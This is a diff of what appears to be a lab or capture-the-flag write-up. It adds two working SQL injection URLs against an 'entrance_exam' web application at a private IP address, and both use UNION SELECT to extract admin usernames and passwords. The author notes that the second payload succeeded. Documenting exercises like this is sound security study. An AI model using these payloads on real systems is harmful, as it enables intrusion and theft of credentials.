@@ -50,11 +50,15 @@ eventually ran into dead end...
 
 but found this SQL injection exploit: https://www.exploit-db.com/exploits/50398
 
-http://127.0.0.1/entrance_exam/admin/view_enrollee.php?id=1'+UNION+SELECT+1,2,3,4,5,6,password,username,9,10,11,12,13,14,15+FROM+admin_list;
+```
+http://10.0.5.31/entrance_exam/admin/view_enrollee.php?id=1'+UNION+SELECT+1,2,3,4,5,6,password,username,9,10,11,12,13,14,15+FROM+admin_list;
+```
 <img width="1592" height="355" alt="image" src="https://github.com/user-attachments/assets/1b635df7-4f84-4c9c-a1e1-e9954033c3d1" />
 
 first SQLi failed but second was successful
-
+```
+https://10.0.5.31/entrance_exam/take_exam.php?id=%27+UNION+SELECT+1,username||%27;%27||password,3,4,5,6,7+FROM+admin_list;
+```
 <img width="1611" height="186" alt="image" src="https://github.com/user-attachments/assets/843969a8-9b10-4f9c-8249-46dd496662a4" />
 <img width="1292" height="433" alt="image" src="https://github.com/user-attachments/assets/7cf66a4c-014c-4d2f-9874-c71604dfd8ce" />
 
